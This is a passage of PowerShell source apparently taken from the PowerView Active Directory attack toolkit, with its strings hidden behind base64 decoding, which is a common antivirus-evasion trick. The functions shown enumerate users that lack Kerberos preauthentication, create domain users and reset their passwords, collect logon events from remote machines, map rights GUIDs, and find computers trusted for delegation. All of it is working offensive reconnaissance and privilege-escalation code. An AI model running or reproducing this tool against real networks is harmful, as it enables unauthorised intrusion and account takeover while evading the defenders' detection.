            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAYQB1AHQAaABOAG8AdABSAGUAcQB1AGkAcgBlAGQA')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByACAAYQBjAGMAbwB1AG4AdABzACAAdABoAGEAdAAgAGQAbwAgAG4AbwB0ACAAcgBlAHEAdQBpAHIAZQAgAGsAZQByAGIAZQByAG8AcwAgAHAAcgBlAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlAA==')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADQAMQA5ADQAMwAwADQAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwAuACoA')))) {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }
            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            Write-Verbose "[Get-DomainUser] filter string: $($UserSearcher.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { $Results = $UserSearcher.FindOne() }
            else { $Results = $UserSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAC4AUgBhAHcA'))))
                }
                else {
                    $User = Convert-LDAPProperty -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAA=='))))
                }
                $User
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainUser] Error disposing of the Results object: $_"
                }
            }
            $UserSearcher.dispose()
        }
    }
}
function New-DomainUser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Description,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    $ContextArguments = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments
    if ($Context) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)
        $User.SamAccountName = $Context.Identity
        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
        $User.SetPassword($TempCred.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))]) {
            $User.Name = $Name
        }
        else {
            $User.Name = $Context.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))]) {
            $User.DisplayName = $DisplayName
        }
        else {
            $User.DisplayName = $Context.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))]) {
            $User.Description = $Description
        }
        Write-Verbose "[New-DomainUser] Attempting to create user '$SamAccountName'"
        try {
            $Null = $User.Save()
            Write-Verbose "[New-DomainUser] User '$SamAccountName' successfully created"
            $User
        }
        catch {
            Write-Warning "[New-DomainUser] Error creating user '$SamAccountName' : $_"
        }
    }
}
function Set-DomainUserPassword {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $AccountPassword,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    $ContextArguments = @{ 'Identity' = $Identity }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ContextArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    $Context = Get-PrincipalContext @ContextArguments
    if ($Context) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)
        if ($User) {
            Write-Verbose "[Set-DomainUserPassword] Attempting to set the password for user '$Identity'"
            try {
                $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
                $User.SetPassword($TempCred.GetNetworkCredential().Password)
                $Null = $User.Save()
                Write-Verbose "[Set-DomainUserPassword] Password for user '$Identity' successfully reset"
            }
            catch {
                Write-Warning "[Set-DomainUserPassword] Error setting password for user '$Identity' : $_"
            }
        }
        else {
            Write-Warning "[Set-DomainUserPassword] Unable to find user '$Identity'"
        }
    }
}
function Get-DomainUserEvent {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $XPathFilter = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $EventArguments = @{
            'FilterXPath' = $XPathFilter
            'LogName' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA==')))
            'MaxEvents' = $MaxEvents
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $EventArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            $EventArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))] = $Computer
            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $Properties = $Event.Properties
                Switch ($Event.Id) {
                    4624 {
                        if(-not $Properties[5].Value.EndsWith('$')) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $Properties[0].Value.ToString()
                                SubjectUserName           = $Properties[1].Value
                                SubjectDomainName         = $Properties[2].Value
                                SubjectLogonId            = $Properties[3].Value
                                TargetUserSid             = $Properties[4].Value.ToString()
                                TargetUserName            = $Properties[5].Value
                                TargetDomainName          = $Properties[6].Value
                                TargetLogonId             = $Properties[7].Value
                                LogonType                 = $Properties[8].Value
                                LogonProcessName          = $Properties[9].Value
                                AuthenticationPackageName = $Properties[10].Value
                                WorkstationName           = $Properties[11].Value
                                LogonGuid                 = $Properties[12].Value
                                TransmittedServices       = $Properties[13].Value
                                LmPackageName             = $Properties[14].Value
                                KeyLength                 = $Properties[15].Value
                                ProcessId                 = $Properties[16].Value
                                ProcessName               = $Properties[17].Value
                                IpAddress                 = $Properties[18].Value
                                IpPort                    = $Properties[19].Value
                                ImpersonationLevel        = $Properties[20].Value
                                RestrictedAdminMode       = $Properties[21].Value
                                TargetOutboundUserName    = $Properties[22].Value
                                TargetOutboundDomainName  = $Properties[23].Value
                                VirtualAccount            = $Properties[24].Value
                                TargetLinkedLogonId       = $Properties[25].Value
                                ElevatedToken             = $Properties[26].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBvAG4ARQB2AGUAbgB0AA=='))))
                            $Output
                        }
                    }
                    4648 {
                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABhAHMAawBoAG8AcwB0AFwALgBlAHgAZQA='))))) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $Properties[0].Value.ToString()
                                SubjectUserName   = $Properties[1].Value
                                SubjectDomainName = $Properties[2].Value
                                SubjectLogonId    = $Properties[3].Value
                                LogonGuid         = $Properties[4].Value.ToString()
                                TargetUserName    = $Properties[5].Value
                                TargetDomainName  = $Properties[6].Value
                                TargetLogonGuid   = $Properties[7].Value
                                TargetServerName  = $Properties[8].Value
                                TargetInfo        = $Properties[9].Value
                                ProcessId         = $Properties[10].Value
                                ProcessName       = $Properties[11].Value
                                IpAddress         = $Properties[12].Value
                                IpPort            = $Properties[13].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBFAHgAcABsAGkAYwBpAHQAQwByAGUAZABlAG4AdABpAGEAbABMAG8AZwBvAG4ARQB2AGUAbgB0AA=='))))
                            $Output
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}
function Get-DomainGUIDMap {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))}
    $ForestArguments = @{}
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ForestArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    try {
        $SchemaPath = (Get-Forest @ForestArguments).schema.name
    }
    catch {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABmAG8AcgBlAHMAdAAgAHMAYwBoAGUAbQBhACAAcABhAHQAaAAgAGYAcgBvAG0AIABHAGUAdAAtAEYAbwByAGUAcwB0AA==')))
    }
    if (-not $SchemaPath) {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAVQBJAEQATQBhAHAAXQAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABmAG8AcgBlAHMAdAAgAHMAYwBoAGUAbQBhACAAcABhAHQAaAAgAGYAcgBvAG0AIABHAGUAdAAtAEYAbwByAGUAcwB0AA==')))
    }
    $SearcherArguments = @{
        'SearchBase' = $SchemaPath
        'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGMAaABlAG0AYQBJAEQARwBVAEkARAA9ACoAKQA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    $SchemaSearcher = Get-DomainSearcher @SearcherArguments
    if ($SchemaSearcher) {
        try {
            $Results = $SchemaSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            $SchemaSearcher.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }
    $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SchemaPath.replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBtAGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAC0AUgBpAGcAaAB0AHMA'))))
    $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBjAG8AbgB0AHIAbwBsAEEAYwBjAGUAcwBzAFIAaQBnAGgAdAApAA==')))
    $RightsSearcher = Get-DomainSearcher @SearcherArguments
    if ($RightsSearcher) {
        try {
            $Results = $RightsSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $_"
                }
            }
            $RightsSearcher.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $_"
        }
    }
    $GUIDs
}
function Get-DomainComputer {
    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $Identity,
        [Switch]
        $Unconstrained,
        [Switch]
        $TrustedToAuth,
        [Switch]
        $Printers,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,
        [ValidateNotNullOrEmpty()]
        [String]
        $OperatingSystem,
        [ValidateNotNullOrEmpty()]
        [String]
        $ServicePack,
        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,
        [Switch]
        $Ping,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $CompSearcher = Get-DomainSearcher @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($CompSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose "[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $IdentityDomain
                        $CompSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $CompSearcher) {
                            Write-Warning "[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif ($IdentityInstance -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                else {
                    $IdentityFilter += "(name=$IdentityInstance)"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdwBpAHQAaAAgAGYAbwByACAAdQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAAgAGQAZQBsAGUAZwBhAHQAaQBvAG4A')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBtAHAAdQB0AGUAcgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAbwBtAHAAdQB0AGUAcgBzACAAdABoAGEAdAAgAGEAcgBlACAAdAByAHUAcwB0AGUAZAAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlACAAZgBvAHIAIABvAHQAaABlAHIAIABwAHIAaQBuAGMAaQBwAGEAbABzAA==')))
